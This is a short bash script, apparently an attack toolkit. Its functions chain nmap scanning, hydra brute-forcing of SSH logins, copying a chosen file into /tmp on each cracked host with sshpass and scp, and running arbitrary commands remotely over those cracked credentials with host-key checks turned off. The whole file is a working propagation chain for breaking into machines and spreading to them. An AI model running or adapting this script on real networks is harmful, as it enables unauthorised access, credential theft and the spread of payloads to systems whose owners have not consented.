#!/usr/bin/env bash
set -x

tfl() {
# TODO delete to make shorter : $1: hydra output $2: file to send
while IFS= read -r line; do
  if [[ $line =~ ssh ]]; then
    sshpass-1.10/sshpass -p "$(echo "$line" | awk '{print $7}')" scp -o StrictHostKeyChecking=no "$2" "$(echo "$line" | awk '{print $5}')"@"$(echo "$line" | awk '{print $3}')":/tmp/
  fi
done <"$1"
echo "funEnd"
}
lcmd() {
f=$1
shift
while IFS= read -r line; do
  if [[ $line =~ host ]]; then
    sshpass-1.10/sshpass -p "$(echo "$line" | awk '{print $7}')" ssh -o StrictHostKeyChecking=no "$(echo "$line" | awk '{print $5}')"@"$(echo "$line" | awk '{print $3}')" ${*} &
  fi
done <"$f"
echo "funEnd"
}
sop() {
./nmap -Pn -oG ips.txt $@ > /dev/null
echo "funEnd"
}
hyd() {
cat ips.txt | grep open | grep ssh | awk -F '[ :/]' '{print $3}' > ssh_ips.txt
hydra/hydra -o success.txt -M ssh_ips.txt ssh $@
echo "funEnd"
}
$@
